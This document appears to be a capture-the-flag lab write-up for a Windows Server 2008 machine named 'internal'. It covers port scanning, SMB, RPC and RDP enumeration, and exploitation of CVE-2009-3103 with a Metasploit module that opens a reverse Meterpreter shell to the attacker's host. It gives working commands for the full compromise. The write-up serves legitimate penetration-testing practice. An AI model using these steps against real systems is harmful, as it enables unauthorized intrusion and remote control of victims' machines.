internal

target 192.168.61.40

```bash
sudo nmap -sC -sV internal -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash
sudo nmap -sC -sV internal -sT -vvv -p- -Pn -T5 --min-rate=5000

PORT      STATE SERVICE            REASON  VERSION
53/tcp    open  domain             syn-ack Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|   Target_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49157/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode:
|   2:0:2:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-01-07T17:12:12
|_  start_date: 2024-08-03T02:11:43
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-07T09:12:12-08:00
|_clock-skew: mean: 1h35m58s, deviation: 3h34m39s, median: -1s
| nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:34:f1 (VMware)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
```
<img width="727" height="54" alt="image" src="https://github.com/user-attachments/assets/dd81d1ae-1c0e-4e77-a0ac-59290d7f4d21" />

Let’s check the HTTP.

<img width="1140" height="260" alt="image" src="https://github.com/user-attachments/assets/b0bad36d-2856-4a50-9734-c8b3b3bf939c" />

It’s nothing. Check SMB.

Let’s run another nmap scan to further enumerate the SMB share.

```bash
sudo nmap -sC -sV -oN smb-nmap 192.168.61.40 -T5 -vvvv --min-rate=5000 -sT -p 445 --script smb-vuln*
```

```bash
PORT    STATE SERVICE      REASON  VERSION
445/tcp open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103:
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
```
We got a CVE, but for now let’s enumerate further.

Judging by the presence of port 53 we see that our target is the Domain of a network.
```bash
From our Active Directory Testing note we remember to start with SMB, so let’s do that.
```

445/TCP - SMB

```bash
enum4linux internal
```
<img width="1038" height="547" alt="image" src="https://github.com/user-attachments/assets/8d9a3403-f7fc-4442-9c12-17afeae0b8ff" />

```bash
smbclient -L \\\\192.168.61.40\\
```
<img width="901" height="186" alt="image" src="https://github.com/user-attachments/assets/0663d3e0-369c-4ac2-8fc3-320b9b86e725" />

With smbclient we can connect, but nothing is shared with the anonymous user.

I then went ahead and checked 135/139 RPC.
135/TCP - RPC

```bash
rpcclient -U "" -N 192.168.61.40
```

<img width="418" height="63" alt="image" src="https://github.com/user-attachments/assets/02b1bd35-565a-41e1-9e88-05aa73ad4e9b" />

We didn’t have the right clearance eventhough we could log in.

Next step would be to test port 3389.
3389/TCP - RDP

I checked the following guide for enumerating this port.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html

```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 192.168.61.40
```

<img width="1141" height="462" alt="image" src="https://github.com/user-attachments/assets/99f599bf-fc8c-494d-b381-458f9d943f40" />

my lab was lagging so i stopped it and start again : new lab ip: 192.168.59.40

This gave us a bunch of info, I then tried to just RDP without creds and to my surprise it worked?
```bash
rdesktop 192.168.59.40
```

<img width="961" height="603" alt="image" src="https://github.com/user-attachments/assets/b311ac08-1306-48bf-8a5e-35605389f163" />

However we don’t have a password.

Let’s enumerate further.
5357/TCP - WSDAPI

<img width="643" height="278" alt="image" src="https://github.com/user-attachments/assets/e6e6618e-8747-4b29-bdd8-d99d722c2c49" />

<img width="895" height="532" alt="image" src="https://github.com/user-attachments/assets/7fdbeeb2-1cc6-4c49-9df7-6f0272f8673f" />



    Port should be correctly mapped by the Windows Firewall to only accept connections from local network.

Interesting…

<img width="647" height="326" alt="image" src="https://github.com/user-attachments/assets/c75d1fe1-6aef-431e-a51e-ed5fa730fe3a" />


Even more interesting!


<img width="602" height="813" alt="image" src="https://github.com/user-attachments/assets/8fddaadb-c7f5-4287-8fa0-9e541f4e561f" />

<img width="604" height="314" alt="image" src="https://github.com/user-attachments/assets/dd11f8b2-b261-45da-a111-a17820d4f4c8" />

When looking for an exploit for this vulnerability we stumble across the exact same PoC we previously found:

<img width="665" height="614" alt="image" src="https://github.com/user-attachments/assets/88c66619-a7c7-436e-94e4-7b4292399c4f" />


<img width="677" height="56" alt="image" src="https://github.com/user-attachments/assets/271efc6b-4c00-4f51-9b96-63eda1221ac0" />


Initial Foothold

Oh, it’s vulnerable to CVE-2009–3103, https://www.exploit-db.com/exploits/40280.

It’s a buffer overflow.. Now lets use Metasploit instead — much better reliability:

```bash
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 192.168.59.40
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 443
exploit
```


### Step-by-step in msfconsole

1. Start Metasploit

```bash
msfconsole
```
<img width="708" height="349" alt="image" src="https://github.com/user-attachments/assets/adcf31be-19ca-4b16-b9aa-c4361586f656" />

2. Load the module

```bash
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
```

(or shorter: `use ms09_050`)
<img width="722" height="40" alt="image" src="https://github.com/user-attachments/assets/18e62a92-077d-4b14-b707-b4dc8f44cd85" />


3. See available targets (very important — wrong target usually = crash without shell)

```bash
show targets
```
<img width="744" height="155" alt="image" src="https://github.com/user-attachments/assets/fe552740-2632-4316-838e-dffa5edc70cb" />


Set the target
```bash
set TARGET 0
```
<img width="750" height="40" alt="image" src="https://github.com/user-attachments/assets/dbd7de47-c706-483f-98c5-adbbf58ecfd7" />


4. Show required options

```bash
show options
```

<img width="983" height="541" alt="image" src="https://github.com/user-attachments/assets/c9047f69-f6d1-4534-bf60-a84409afa0dc" />


5. Set the most important options

```bash
set RHOSTS 192.168.59.40
set LHOST <your-kali-ip>          # e.g. 192.168.49.219 or tun0 IP
set LPORT 443                     # or 4444, 9001 — avoid well-known ports if possible
```

<img width="878" height="110" alt="image" src="https://github.com/user-attachments/assets/0e6e00ab-3361-425a-80b1-475589594d95" />


Optional but recommended:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp     # default is usually fine
# or windows/x64/meterpreter/reverse_tcp if target is 64-bit
```

<img width="974" height="37" alt="image" src="https://github.com/user-attachments/assets/94e8dda1-8246-4911-88e5-e894fc2bbef0" />


6. (Optional) Check if the target looks vulnerable  
   (this module has a basic check — not 100% reliable, but worth running)

```bash
check
```

7. Run the exploit

```bash
exploit
```

(or shorter: `run` or just `exploit -j` to background it)

<img width="984" height="131" alt="image" src="https://github.com/user-attachments/assets/5dcca77e-6ee3-4d67-8c55-1476cbded44e" />


The exploit worked perfectly — you now have a Meterpreter session open:

<img width="795" height="130" alt="image" src="https://github.com/user-attachments/assets/d041aa2e-e0a1-49c0-879d-dbbf8b288687" />

now to find flag. go to desktop
```bash
cd \Users\Administrator\Desktop
dir
type proof.txt
```
<img width="463" height="59" alt="image" src="https://github.com/user-attachments/assets/0d1bd669-8da4-4b01-a5c6-1d3a3b92ff80" />

